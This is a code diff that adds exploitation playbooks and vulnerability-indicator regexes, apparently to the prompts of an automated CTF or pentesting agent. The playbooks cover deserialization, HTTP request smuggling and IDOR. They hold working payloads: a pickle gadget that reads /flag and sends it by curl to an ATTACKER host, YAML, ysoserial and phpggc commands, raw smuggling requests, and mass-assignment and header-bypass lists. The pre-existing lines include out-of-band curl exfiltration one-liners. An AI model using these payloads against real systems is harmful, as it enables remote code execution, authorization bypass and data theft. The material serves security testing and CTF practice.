@@ -348,6 +348,231 @@ Once you have RCE (even blind), immediately try:
 - Find and read flags: ; find / -name 'flag*' 2>/dev/null
 - Check env vars: ; env | grep -i flag
 - Try out-of-band: ; curl http://your-server/$(whoami)`,
+
+  deserialization: `## Deserialization Playbook
+Covers PHP, Python pickle, Ruby Marshal, Java, .NET, and YAML deserialization.
+Look at every place that accepts serialized blobs: cookies, hidden form fields, file uploads, cache files, API bodies with base64/hex data.
+
+### PHP unserialize()
+- If source is available, grep for: unserialize(, __wakeup, __destruct, __toString, __call magic methods
+- Baseline test — confirm a param is unserialized by sending: O:8:"stdClass":0:{}
+  - Valid → no error; garbage → "unserialize(): Error at offset" leaks existence
+- Common POP gadget chains via **phpggc**:
+  - Laravel/RCE1..12, Symfony/RCE1..6, Monolog/RCE1..9, Guzzle/RCE1, Slim/RCE1, CodeIgniter4/RCE1
+  - Usage: \`phpggc Monolog/RCE1 system id | base64 -w0\`
+- Wrap payload in cookie, POST body, or X-Forwarded-For-style headers. Try base64 AND raw.
+- If framework unknown, fingerprint first: cookie names (laravel_session, XSRF-TOKEN), Set-Cookie, X-Powered-By, error stack traces.
+- Phar deserialization: a file upload that lands anywhere + a call like file_exists("phar://upload.jpg") triggers unserialize on phar metadata.
+
+### Python pickle
+- pickle.loads() on attacker data is direct RCE.
+- Payload template:
+  \`\`\`python
+  import pickle, base64, os
+  class E:
+      def __reduce__(self): return (os.system, ('cat /flag* > /tmp/f; curl http://ATTACKER/$(cat /tmp/f)',))
+  print(base64.b64encode(pickle.dumps(E())).decode())
+  \`\`\`
+- Common sinks: session cookies (Flask-Session with pickle backend), cache files, /tmp/*.pkl, Celery task bodies, joblib/numpy loads, any "shelve" usage.
+
+### YAML deserialization (Ruby / Python / Java SnakeYAML)
+- Look for yaml.load() WITHOUT SafeLoader (Python), YAML.load (Ruby), SnakeYAML new Yaml() (Java).
+- **Python PyYAML** (yaml.load with FullLoader/Loader):
+  - \`!!python/object/new:os.system ["cat /flag"]\`
+  - \`!!python/object/apply:os.system ["id"]\`
+  - \`!!python/object/apply:subprocess.check_output [["cat","/flag"]]\`
+  - Older: \`!!python/object/apply:subprocess.Popen [["/bin/sh","-c","id"]]\`
+- **Ruby Psych/YAML**:
+  - \`!ruby/object:Gem::Installer\` chains (universal RCE gadget)
+  - \`!ruby/hash:ActionController::Parameters\` for mass assignment
+- **Java SnakeYAML**:
+  - \`!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://ATTACKER/"]]]]\`
+- Env-based keys: if the app derives a signing key from env vars, check /proc/self/environ or any LFI sink to steal it, then re-sign malicious YAML.
+
+### Java deserialization
+- Magic bytes: \`\\xac\\xed\\x00\\x05\` (base64: \`rO0AB\`). Grep every response/request for \`rO0AB\`.
+- Content-Type: \`application/x-java-serialized-object\` is a giveaway.
+- Build payloads with **ysoserial**:
+  - \`java -jar ysoserial.jar CommonsCollections1 'id' | base64 -w0\`
+  - Gadget chains: CommonsCollections1-7, CommonsBeanutils1, Spring1/2, Hibernate1/2, JRE8u20, URLDNS (for blind detection)
+- Blind detection: use **URLDNS** chain pointing at Burp Collaborator / your DNS listener.
+- Common sinks: RMI (:1099), JMX, T3 (WebLogic :7001), JMS, ViewState, JSF, Struts2 OGNL.
+
+### .NET deserialization
+- BinaryFormatter, SoapFormatter, LosFormatter, ObjectStateFormatter (ViewState), Json.NET with TypeNameHandling.
+- Use **ysoserial.net**: \`ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "cmd /c calc"\`
+- ViewState: check for \`__VIEWSTATE\` with no MAC — classic RCE.
+
+### Ruby Marshal
+- \`Marshal.load(attacker_data)\` → RCE via Gem::Installer gadget.
+- Often hidden in cookies (Rack session) — decode base64, look for \`\\x04\\x08\` header.
+
+### Workflow
+1. Identify serialization format from magic bytes / Content-Type / cookie shape.
+2. Send a benign baseline blob to confirm it's deserialized (error shape reveals the parser).
+3. Pick a gadget chain matching the fingerprinted framework.
+4. Start with blind/OOB (URLDNS, curl Collaborator) before going for full RCE.
+5. For \`/flag\` exfil, prefer \`curl http://ATTACKER/$(base64 /flag)\` or write to a web-readable path.`,
+
+  request_smuggling: `## HTTP Request Smuggling Playbook
+HTTP/1.1 desync attacks exploit disagreement between front-end and back-end about request boundaries.
+
+### Variants
+- **CL.TE** — front-end uses Content-Length, back-end uses Transfer-Encoding.
+- **TE.CL** — front-end uses Transfer-Encoding, back-end uses Content-Length.
+- **TE.TE** — both honor TE but one can be tricked by an obfuscated duplicate.
+- **H2.CL / H2.TE** — HTTP/2 downgrade smuggling when front-end speaks H2 but back-end H1.
+
+### Timing-based detection (safest first step)
+Use curl --raw or raw Python sockets. A vulnerable server stalls ~timeout seconds on a smuggled incomplete request.
+
+**CL.TE probe** (should hang if vulnerable):
+\`\`\`
+POST / HTTP/1.1
+Host: target
+Content-Length: 4
+Transfer-Encoding: chunked
+
+1
+A
+X
+\`\`\`
+
+**TE.CL probe** (should hang if vulnerable):
+\`\`\`
+POST / HTTP/1.1
+Host: target
+Content-Length: 6
+Transfer-Encoding: chunked
+
+0
+
+X
+\`\`\`
+
+### Exploitation payloads
+
+**CL.TE — smuggle a prefix** (back-end sees SMUGGLED as start of next request):
+\`\`\`
+POST / HTTP/1.1
+Host: target
+Content-Length: 13
+Transfer-Encoding: chunked
+
+0
+
+SMUGGLED
+\`\`\`
+
+**TE.CL — smuggle with chunked prefix**:
+\`\`\`
+POST / HTTP/1.1
+Host: target
+Content-Length: 4
+Transfer-Encoding: chunked
+
+5c
+GPOST / HTTP/1.1
+Host: target
+Content-Length: 15
+
+x=1
+0
+
+\`\`\`
+
+**TE header obfuscation** (to coax TE.TE):
+- \`Transfer-Encoding: xchunked\`
+- \`Transfer-Encoding : chunked\` (space before colon)
+- \`Transfer-Encoding:\\x0bchunked\`
+- \`Transfer-encoding: chunked\\r\\nTransfer-encoding: x\`
+- \`TRANSFER-ENCODING: chunked\`
+
+### Confirming exploitability
+- Smuggle a GET for a known 404 path — if the NEXT unrelated request returns that 404 body, confirmed.
+- Smuggle \`GET /admin HTTP/1.1\\r\\nX:\` and watch for admin content leaking to other users.
+- For auth-bypass routes (e.g., a protected router/admin UI): smuggle to hit /admin, /router, /config.
+
+### Tools
+- **smuggler.py** (defparam/smuggler) — automated CL.TE/TE.CL/TE.TE detection with timing oracle.
+- **Burp Turbo Intruder** with \`race.py\` / \`smuggle.py\` templates.
+- \`curl --http1.1 --raw\` + bash here-docs for manual crafting.
+- Python + raw socket when curl normalizes headers you need to keep broken:
+  \`\`\`python
+  import socket
+  s = socket.socket(); s.connect((host, 80))
+  s.send(b"POST / HTTP/1.1\\r\\nHost: x\\r\\nContent-Length: 13\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nSMUGGLED")
+  print(s.recv(4096))
+  \`\`\`
+
+### Gotchas
+- Need a reused (keep-alive) connection. Send two requests back-to-back on one socket.
+- Many CDNs (Cloudflare, Akamai) patched classic smuggling — look for custom proxies (old HAProxy, old nginx, Apache Traffic Server).
+- If the target routes by path behind a reverse proxy, smuggling can cross virtual-host boundaries.`,
+
+  creative_idor: `## Creative IDOR Playbook
+When obvious enumeration (id=1..1000) fails, resort to unconventional tampering.
+
+### Non-numeric identifier tricks
+- Negative: \`id=-1\`, \`id=-0\`, \`id=0\`
+- Extremes: \`id=2147483647\` (MAX_INT), \`id=9999999999\`, \`id=0x1\`, \`id=1e10\`
+- Strings where int expected: \`id=first\`, \`id=admin\`, \`id=root\`, \`id=me\`, \`id=self\`, \`id=current\`, \`id=default\`
+- Weird numerics: \`id=1.0\`, \`id=01\`, \`id=1%00\`, \`id=+1\`, \`id=1 \` (trailing space)
+- Wildcards: \`id=*\`, \`id=%\`, \`id=_\`, \`id=.*\` (some ORMs interpret)
+- UUIDs when numeric expected and vice versa.
+
+### Mass assignment
+Add unexpected fields to update/create bodies:
+- \`is_admin=1\`, \`isAdmin=true\`, \`role=admin\`, \`role=superuser\`, \`admin=1\`
+- \`user_id=1\`, \`owner_id=1\`, \`account_id=1\`, \`organization_id=1\`
+- \`verified=true\`, \`email_verified=1\`, \`active=1\`, \`approved=1\`
+- \`price=0\`, \`discount=100\`, \`balance=99999\`
+Always try both camelCase and snake_case — frameworks vary.
+
+### HTTP method tampering
+For every endpoint, try all of: GET, POST, PUT, PATCH, DELETE, HEAD, OPTIONS. Many apps only ACL the documented method.
+- \`curl -X PUT /api/users/2\` when only GET is documented
+- Try \`X-HTTP-Method-Override: PUT\`, \`X-HTTP-Method: DELETE\`, \`_method=PUT\` in body
+
+### Header tampering / path confusion
+- \`X-Original-URL: /admin/users/1\`
+- \`X-Rewrite-URL: /admin\`
+- \`X-Forwarded-For: 127.0.0.1\`, \`X-Real-IP: 127.0.0.1\`
+- \`X-Forwarded-Host: localhost\`
+- \`Referer: http://localhost/admin\`
+- \`X-User-Id: 1\`, \`X-User: admin\`, \`X-Remote-User: admin\`
+- Path tricks: \`/users/1/../2\`, \`/users/1%2f..%2f2\`, \`/users/1;id=2\`, \`/users/1.json\` vs \`/users/1\`
+
+### Parameter pollution (HPP)
+Different parsers pick first, last, or concatenate:
+- \`?id=1&id=2\` — PHP takes last, ASP concats, Node/Express gives an array
+- \`?id[]=1&id[]=2\` — array smuggling
+- \`?id=1%26id=2\` (URL-encoded separator)
+- Body + query mixing: \`POST ?id=1\` with body \`id=2\`
+
+### Content-type switching
+- Send JSON body when endpoint expects form: \`Content-Type: application/json\` with \`{"id":2}\`
+- Send form when it expects JSON: \`id=2\` form-encoded
+- Send XML: \`<user><id>2</id></user>\` with \`Content-Type: application/xml\`
+- Multipart: \`Content-Type: multipart/form-data\`
+- Sometimes a different parser skips auth middleware entirely.
+
+### API versioning and shadow endpoints
+- \`/v1/\`, \`/v2/\`, \`/v3/\`, \`/api/\`, \`/api/v1/\`, \`/api/v2/\`, \`/api/internal/\`, \`/api/admin/\`
+- \`/legacy/\`, \`/old/\`, \`/beta/\`, \`/staging/\`, \`/debug/\`
+- Trailing slash and case: \`/Users/1\` vs \`/users/1\`, \`/USERS/1\`
+- Extensions: \`/users/1\`, \`/users/1.json\`, \`/users/1.xml\`, \`/users/1.api\`
+
+### Indirect / second-order IDOR
+- Change your own object, then trigger a flow that references its ID elsewhere.
+- Race the authorization check: request an ID you don't own in parallel with switching ownership.
+- Look at "export", "download", "print", "pdf" endpoints — often skip ACL.
+
+### Workflow
+1. Map every endpoint that includes an ID-like parameter (path, query, body, header).
+2. For each, run through: numeric tricks → method swap → header tricks → HPP → content-type swap.
+3. Keep a table: endpoint × technique → response length/code. Diffs reveal the bypass.
+4. For "get the first record" style challenges, the flag often lives at id=1, id=0, id=-1, or id=first — but the app rejects your user. Focus on method/header/HPP bypasses on the /1 route.`,
 };
 
 // ── Vuln type indicators — pattern-match on tool result strings ──
@@ -521,6 +746,95 @@ const INDICATORS: VulnIndicator[] = [
       /ping\s/i,
       /nslookup/i,
       /traceroute/i,
+    ],
+  },
+  {
+    type: "deserialization",
+    patterns: [
+      // PHP
+      /unserialize\s*\(/i,
+      /__wakeup/,
+      /__destruct/,
+      /O:\d+:"[\w\\]+":\d+:\{/, // PHP serialized object header
+      /unserialize\(\):\s*Error at offset/i,
+      /phpggc/i,
+      // Python pickle
+      /pickle\.loads?\s*\(/i,
+      /cPickle/i,
+      /__reduce__/,
+      // YAML
+      /yaml\.load\s*\(/i,
+      /!!python\/object/i,
+      /!ruby\/object/i,
+      /SnakeYAML/i,
+      /FullLoader/,
+      /SafeLoader/,
+      // Java
+      /rO0AB/, // base64 of Java serialization magic
+      /\xac\xed\x00\x05/,
+      /application\/x-java-serialized-object/i,
+      /ysoserial/i,
+      /CommonsCollections/i,
+      // .NET
+      /BinaryFormatter/i,
+      /ObjectStateFormatter/i,
+      /__VIEWSTATE/,
+      /TypeNameHandling/i,
+      // Ruby
+      /Marshal\.load/i,
+      /Gem::Installer/,
+      // Generic
+      /deserializ/i,
+      /serializ.*object/i,
+    ],
+  },
+  {
+    type: "request_smuggling",
+    patterns: [
+      /Transfer-Encoding/i,
+      /chunked/i,
+      /Content-Length.*Transfer-Encoding/is,
+      /Transfer-Encoding.*Content-Length/is,
+      /CL\.TE/i,
+      /TE\.CL/i,
+      /TE\.TE/i,
+      /desync/i,
+      /smuggl/i,
+      /HAProxy/i,
+      /Apache Traffic Server/i,
+      /\bnginx\/1\.[0-9]\./i, // old nginx often vulnerable
+      /HTTP\/1\.1.*keep-alive/i,
+      /front.?end.*back.?end/i,
+      /reverse.proxy/i,
+      /X-Forwarded-For/i,
+    ],
+  },
+  {
+    type: "creative_idor",
+    patterns: [
+      /\/api\/v\d+\//i,
+      /\/v\d+\//,
+      /id=\d+/,
+      /user_?id/i,
+      /owner_?id/i,
+      /account_?id/i,
+      /role=/i,
+      /is_?admin/i,
+      /X-Original-URL/i,
+      /X-Rewrite-URL/i,
+      /X-HTTP-Method/i,
+      /_method=/i,
+      /mass.assignment/i,
+      /parameter.pollution/i,
+      /\bHPP\b/,
+      /403.*forbidden/i,
+      /401.*unauthorized/i,
+      /not.*authorized/i,
+      /permission.denied/i,
+      /access.denied/i,
+      /enumerate/i,
+      /sequential.*id/i,
+      /predictable.*id/i,
     ],
   },
   {
